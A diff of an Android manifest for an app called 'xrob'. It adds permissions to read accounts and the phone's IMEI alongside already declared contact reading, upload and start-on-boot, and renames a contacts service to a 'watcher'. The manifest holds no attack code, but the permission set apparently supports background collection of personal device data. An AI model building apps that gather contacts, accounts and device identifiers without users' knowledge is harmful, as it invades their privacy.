@@ -2,6 +2,8 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.theah64.xrob">
 
+
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     <!--What?-->
     <uses-permission android:name="android.permission.INTERNET" />
     <!-- To start contact listener -->
@@ -10,8 +12,11 @@
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <!--To start upload-->
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!--To read IMEI-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
     <application
+        android:name=".utils.Xrob"
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
@@ -25,7 +30,7 @@
             </intent-filter>
         </activity>
 
-        <service android:name=".services.ContactsService" />
+        <service android:name=".services.ContactsWatcherService" />
 
         <receiver android:name=".receivers.BootCompleteReceiver">
             <intent-filter>
